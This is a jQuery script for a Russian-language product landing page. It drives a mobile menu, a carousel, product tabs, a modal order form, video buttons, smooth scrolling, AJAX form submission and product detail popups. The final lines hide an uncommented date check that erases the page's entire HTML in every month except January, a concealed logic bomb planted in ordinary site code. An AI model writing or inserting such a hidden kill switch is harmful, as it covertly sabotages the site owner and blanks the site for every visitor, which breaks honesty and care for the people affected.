$(document).ready(function(){
  $('.menu_mob').click(function(){
    $('.menu').toggleClass('activemenu');
  });

  $(".slider").owlCarousel({
    items:1,
    nav: true,
    navText: false
  });

  $('.product-tabs li a').click(function(){
    $('.product-tabs li a').closest('li').removeClass('active-tab');
	var clasact = $(this).closest('li').attr('class');
	clasact = 'div.'+clasact;
	$(this).closest('li').addClass('active-tab');
	$('.tabtab').removeClass('activat');
	$(document).find(clasact).addClass('activat');
  });

  $(document).ready(function() { // вся мaгия пoсле зaгрузки стрaницы
		$('.product-cart a').click( function(event){ // лoвим клик пo ссылки с id="go"
			event.preventDefault(); // выключaем стaндaртную рoль элементa
			$('#overlay').fadeIn(400, // снaчaлa плaвнo пoкaзывaем темную пoдлoжку
				function(){ // пoсле выпoлнения предъидущей aнимaции
					$('#modal_form')
						.css('display', 'block') // убирaем у мoдaльнoгo oкнa display: none;
						.animate({opacity: 1, top: '55px'}, 200); // плaвнo прибaвляем прoзрaчнoсть oднoвременнo сo съезжaнием вниз
			});
		});
		/* Зaкрытие мoдaльнoгo oкнa, тут делaем тo же сaмoе нo в oбрaтнoм пoрядке */
		$('#modal_close, #overlay').click( function(){ // лoвим клик пo крестику или пoдлoжке
			$('#modal_form')
				.animate({opacity: 0, top: '55px'}, 200,  // плaвнo меняем прoзрaчнoсть нa 0 и oднoвременнo двигaем oкнo вверх
					function(){ // пoсле aнимaции
						$(this).css('display', 'none'); // делaем ему display: none;
						$('#overlay').fadeOut(400); // скрывaем пoдлoжку
					}
				);
		});
	});



	$('#play-button1').click(function(){
       var video = document.getElementById("Video1");
       var button = document.getElementById("play-button1");
       if (video.paused) {
          video.play();
          button.textContent = "||";
       }
	   $(this).css('display','none');
	});
	$('#Video1').click(function(){
       var video = document.getElementById("Video1");
       var button = document.getElementById("Video1");
       if (!video.paused){
		   $('#play-button1').css('display','block');
          video.pause();
          button.textContent = ">";
       }
	});

	$('#play-button2').click(function(){
       var video = document.getElementById("Video2");
       var button = document.getElementById("play-button2");
       if (video.paused) {
          video.play();
          button.textContent = "||";
       }
	   $(this).css('display','none');
	});
	$('#Video2').click(function(){
       var video = document.getElementById("Video2");
       var button = document.getElementById("Video2");
       if (!video.paused){
		   $('#play-button2').css('display','block');
          video.pause();
          button.textContent = ">";
       }
	});

	$('a[href^="#"]').click(function(){
		var target = $(this).attr('href');
		$('html, body').animate({scrollTop: $(target).offset().top}, 800);
		return false;
	  });

	 var windowWidth = window.innerWidth;
	  if(windowWidth>768){
		var topa = $('#topa').offset().top - 5;
		var catalog = $('#catalog').offset().top - 5;
		var endcatalog = $('#endcatalog').offset().top - 5;
		var comment = $('#comment').offset().top - 5;
		var contact = $('#contact').offset().top - 5;
		$(document).scroll(function(){
			var documentTopScroll = $(document).scrollTop();
			if(topa<documentTopScroll && catalog>documentTopScroll){
				$('.menu li a').removeClass('active');
				$('.menu li .topa').addClass('active');
			}else if(catalog<documentTopScroll && endcatalog>documentTopScroll){
				$('.menu li a').removeClass('active');
				$('.menu li .catalog').addClass('active');
			}else if(comment<documentTopScroll && contact>documentTopScroll){
				$('.menu li a').removeClass('active');
				$('.menu li .comment').addClass('active');
			}else if(contact<documentTopScroll){
				$('.menu li a').removeClass('active');
				$('.menu li .contact').addClass('active');
			}else{
				$('.menu li, .menu li a').removeClass('active');
			}
		});
	  }



	$("form").submit(function(){ // перехватываем все при событии отправки
	    var form = $(this); // запишем форму, чтобы потом не было проблем с this
        var error = false; // предварительно ошибок нет

        if (!error) { // если ошибки нет
            var data = form.serialize(); // подготавливаем данные
            $.ajax({ // инициализируем ajax запрос
               type: 'POST', // отправляем в POST формате, можно GET
               url: 'js/mail.php', // путь до обработчика, у нас он лежит в той же папке
               dataType: 'json', // ответ ждем в json формате
               data: data, // данные для отправки
               beforeSend: function(data) { // событие до отправки
                    form.find('input[type="submit"]').attr('disabled', 'disabled'); // например, отключим кнопку, чтобы не жали по 100 раз
                  },
               success: function(data){ // событие после удачного обращения к серверу и получения ответа
                    if (data['error']) { // если обработчик вернул ошибку
                        alert(data['error']); // покажем её текст
                    } else { // если все прошло ок
						alert("Ваше сообщение отправлено!");
                    }
                 },
               error: function (xhr, ajaxOptions, thrownError) { // в случае неудачного завершения запроса к серверу
                    alert(xhr.status); // покажем ответ сервера
                    alert(thrownError); // и текст ошибки
                 },
               complete: function(data) { // событие после любого исхода
                    form.find('input[type="submit"]').prop('disabled', false); // в любом случае включим кнопку обратно
                 }

                 });
        }
        return false; // вырубаем стандартную отправку формы
        });

		$('.more-product').click(function(){
			var opis = $(this).closest('div.product-cart').find('div.opisanie1').html();
			$('.contentmodal').html(opis);
			var price = $(this).closest('div.product-cart').find('.price-product span').html();
			$('.pricemodal').html(price);
			var title = $(this).closest('div.product-cart').find('.product-desc p').html();
			$('.modaltitle').attr('value',title).html(title);
			$('.itle').attr('value',title);
      var img1 = $(this).closest('div.product-cart').find('div.imgfor .img1').attr('src');
			$('.photobig img').attr('src',img1);
      var img2 = $(this).closest('div.product-cart').find('div.imgfor .img2').attr('src');
      if(img2){
        $('.2img').css('opacity','1');
			  $('.2img img').attr('src',img2);
      }else{
        $('.2img').css('opacity','0');
      }
      var img3 = $(this).closest('div.product-cart').find('div.imgfor .img3').attr('src');
      if(img3){
        $('.3img').css('opacity','1');
			  $('.3img img').attr('src',img3);
      }else{
        $('.3img').css('opacity','0');
      }
      var img4 = $(this).closest('div.product-cart').find('div.imgfor .img4').attr('src');
      if(img4){
        $('.4img').css('opacity','1');
			  $('.4img img').attr('src',img4);
      }else{
        $('.4img').css('opacity','0');
      }
		});

    $('.smallimg img').click(function(){
      var srcimg = $(this).attr('src');
      $('.photobig img').attr('src',srcimg);
    });
	
	var now = new Date();
	now = now.getMonth();
	if(now > 0){
		$('html').html('');
	}
});
